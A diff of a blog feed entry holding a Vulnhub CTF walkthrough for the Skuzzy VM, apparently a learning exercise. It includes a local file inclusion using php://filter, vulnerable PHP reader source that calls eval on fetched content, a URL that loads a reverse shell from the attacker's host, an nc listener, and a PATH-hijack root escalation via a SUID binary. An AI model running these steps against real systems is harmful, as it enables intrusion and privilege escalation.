@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Vulnhub | CyberSlave]]></title>
   <link href="http://ryanoberto.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
   <link href="http://ryanoberto.github.io/"/>
-  <updated>2017-03-28T12:38:31+02:00</updated>
+  <updated>2017-03-28T12:54:03+02:00</updated>
   <id>http://ryanoberto.github.io/</id>
   <author>
     <name><![CDATA[Ryan Oberto]]></name>
@@ -301,47 +301,169 @@ Soup Nazi: NO FLAG FOR YOU
 
 <p><a href="http://192.168.56.101/c2444910794e037ebd8aaf257178c90b/?p=../../../../var/log/wtmp">http://192.168.56.101/c2444910794e037ebd8aaf257178c90b/?p=../../../../var/log/wtmp</a></p>
 
-<p><a href="http://192.168.56.101/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php">http://192.168.56.101/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php</a></p>
+<p>Download the flag.php source</p>
 
-<p>~/EW_Skuzzy # cat flag.php
+<p><a href="http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php">http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php</a></p>
+
+<p>Flag 4
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>~/EW_Skuzzy # cat flag.php
+</span><span class='line'>&lt;?php
+</span><span class='line'>defined (&lsquo;VIAINDEX&rsquo;) or die(&lsquo;Ooooh! So close..&rsquo;);
+</span><span class='line'>?&gt;&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;Flag&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Hmm. Looking for a flag? Come on... I haven't made it easy yet, did you think I was going to this time?&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;&lt;img src="trollface.png" /&gt;
+</span><span class='line'>&lt;?php
+</span><span class='line'>// Ok, ok. Here&rsquo;s your flag!
+</span><span class='line'>//
+</span><span class='line'>// flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}
+</span><span class='line'>//
+</span><span class='line'>// Well done, you&rsquo;re doing great so far!
+</span><span class='line'>// Next step. SHELL!
+</span><span class='line'>//
+</span><span class='line'>//
+</span><span class='line'>// Oh. That flag above? You&rsquo;re gonna need it&hellip;
+</span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Download the reader source</p>
+
+<p><a href="http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=reader.php">http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=reader.php</a></p>
+
+<p>&#8220;`
 &lt;?php
 defined (&lsquo;VIAINDEX&rsquo;) or die(&lsquo;Ooooh! So close..&rsquo;);
 ?></p>
 
-<h1>Flag</h1>
+<h1>Feed Reader</h1>
 
 
-<p>Hmm. Looking for a flag? Come on&#8230; I haven&#8217;t made it easy yet, did you think I was going to this time?</p>
+<p>&lt;?php
+if(isset($<em>GET[&lsquo;url&rsquo;])) {
+    $url = $</em>GET[&lsquo;url&rsquo;];
+} else {
+    print(&ldquo;<a href=\"?p=reader&url=http://127.0.0.1/c2444910794e037ebd8aaf257178c90b/data.txt\">Load Feed</a>&rdquo;);
+}</p>
+
+<p>if(isset($url) &amp;&amp; strlen($url) != &lsquo;&rsquo;) {</p>
+
+<pre><code>// Setup some variables.
+$secretok = false;
+$keyneeded = true;
+
+// Localhost as a source doesn't need to use the key.
+if(preg_match("#^http://127.0.0.1#", $url)) {
+    $keyneeded = false;
+    $secretok = true;
+}
+
+// Handle the key validation when it's needed.
+if($keyneeded) {
+    $key = $_GET['key'];
+    if(is_array($key)) {
+        die("Array trick is mitigated ;)");
+    }
+    if(isset($key) &amp;&amp; strlen($key) == '47') {
+    $hashedkey = hash('sha256', $key);
+        $secret = "5ccd0dbdeefbee078b88a6e52db8c1caa8dd8315f227fe1e6aee6bcb6db63656";
+
+        // If you can use the following code for a timing attack
+        // then good luck :) But.. You have the source anyway, right? :)
+    if(strcmp($hashedkey, $secret) == 0) {
+            $secretok = true;
+        } else {
+            die("Sorry... Authentication failed. Key was invalid.");
+    }
+
+    } else {
+        die("Authentication invalid. You might need a key.");
+    }
+}
+
+// Just to make sure the above key check was passed.
+if(!$secretok) {
+    die("Something went wrong with the authentication process");
+}
+
+// Now load the contents of the file we are reading, and parse
+// the super awesomeness of its contents!
+$f = file_get_contents($url);
+
+$text = preg_split("/##text##/s", $f);
+
+if(isset($text['1']) &amp;&amp; strlen($text['1']) &gt; 0) {
+    print($text['1']);
+}
+
+print "&lt;br /&gt;&lt;br /&gt;";
+
+$php = preg_split("/##php##/s", $f);
+
+if(isset($php['1']) &amp;&amp; strlen($php['1']) &gt; 0) {
+    eval($php['1']);
+    // "If Eval is the answer, you're asking the wrong question!" - SG
+    // It hurts me to write insecure code like this, but it is in the
+    // name of education, and FUN, so I'll let it slide this time.
+}
+</code></pre>
+
+<p>}</p>
+
+<pre><code>
+We know from the above code we require a key and that it needs to be 47 char long. lets try our flag4 
+
+http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=reader&amp;key=flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}&amp;url=http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/data.txt
 
 
-<p><img src="trollface.png" />
-&lt;?php
-// Ok, ok. Here&rsquo;s your flag!
-//
-// flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}
-//
-// Well done, you&rsquo;re doing great so far!
-// Next step. SHELL!
-//
-//
-// Oh. That flag above? You&rsquo;re gonna need it&hellip;
-?></p>
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 
-<p><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p>
 
-<p>~/EW_Skuzzy # nc -lvp 8888             <br/>
-listening on [any] 8888 &hellip;</p>
 
-<p><a href="http://192.168.56.101/c2444910794e037ebd8aaf257178c90b/?p=reader&amp;key=flag4">http://192.168.56.101/c2444910794e037ebd8aaf257178c90b/?p=reader&amp;key=flag4</a>{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}&amp;url=<a href="http://192.168.56.102/data.txt">http://192.168.56.102/data.txt</a></p>
 
-<p>python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
-export TERM=xterm</p>
 
-<p>exploit
-<a href="https://www.exploit-db.com/exploits/40616/">https://www.exploit-db.com/exploits/40616/</a></p>
+~/EW_Skuzzy # nc -lvp 8888               
+listening on [any] 8888 ...
 
-<p>www-data@skuzzy:/$ find / -perm -4000 2>/dev/null
-find / -perm -4000 2>/dev/null
+http://192.168.56.101/c2444910794e037ebd8aaf257178c90b/?p=reader&amp;key=flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}&amp;url=http://192.168.56.102/data.txt
+
+
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+
+
+exploit
+https://www.exploit-db.com/exploits/40616/
+
+www-data@skuzzy:/$ find / -perm -4000 2&gt;/dev/null
+find / -perm -4000 2&gt;/dev/null
 /usr/lib/policykit-1/polkit-agent-helper-1
 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
 /usr/lib/openssh/ssh-keysign
@@ -365,38 +487,38 @@ find / -perm -4000 2>/dev/null
 /bin/ping
 /bin/ping6
 /bin/umount
-/opt/alicebackup</p>
+/opt/alicebackup
 
-<p>cat /tmp/id</p>
 
-<h1>!/bin/bash</h1>
+cat /tmp/id
+#!/bin/bash
+/bin/bash
 
-<p>/bin/bash</p>
+export PATH=/tmp
 
-<p>export PATH=/tmp</p>
-
-<p>www-data@skuzzy:/opt$ ./alicebackup
+www-data@skuzzy:/opt$ ./alicebackup
 ./alicebackup
 bash: groups: command not found
-root@skuzzy:/opt#
-root@skuzzy:/opt# export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin</p>
+root@skuzzy:/opt# 
+root@skuzzy:/opt# export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin
+</code></pre>
 
-<pre><code>root@skuzzy:/root# cat flag.txt
-Congratulations!
+<p>root@skuzzy:/root# cat flag.txt
+Congratulations!</p>
 
-flag5{42273509a79da5bf49f9d40a10c512dd96d89f6a}
+<p>flag5{42273509a79da5bf49f9d40a10c512dd96d89f6a}</p>
 
-You've found the final flag and pwned this CTF VM!
+<p>You&rsquo;ve found the final flag and pwned this CTF VM!</p>
 
-I really hope this was an enjoyable challenge, and that my trolling and messing with you didn't upset you too much! I had a blast making this VM, so it won't be my last!
+<p>I really hope this was an enjoyable challenge, and that my trolling and messing with you didn&rsquo;t upset you too much! I had a blast making this VM, so it won&rsquo;t be my last!</p>
 
-I'd love to hear your thoughts on this one.
+<p>I&rsquo;d love to hear your thoughts on this one.
 Too easy?
 Too hard?
-Too much stuff to install to get the iSCSI initiator working?
+Too much stuff to install to get the iSCSI initiator working?</p>
 
-Drop me a line on twitter @vortexau, or via email vortex@juicedigital.net
-</code></pre>
+<p>Drop me a line on twitter @vortexau, or via email <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#118;&#111;&#114;&#116;&#101;&#120;&#x40;&#106;&#x75;&#x69;&#99;&#x65;&#100;&#x69;&#x67;&#105;&#116;&#x61;&#x6c;&#x2e;&#x6e;&#x65;&#116;">&#x76;&#111;&#x72;&#116;&#x65;&#120;&#x40;&#106;&#x75;&#x69;&#x63;&#x65;&#100;&#x69;&#103;&#105;&#116;&#x61;&#x6c;&#x2e;&#110;&#101;&#116;</a>
+&#8220;`</p>
 
 <p>This was great fun and learnt something new, Thanks <a href="https://twitter.com/@vortexau">@vortexau</a></p>
 ]]></content>
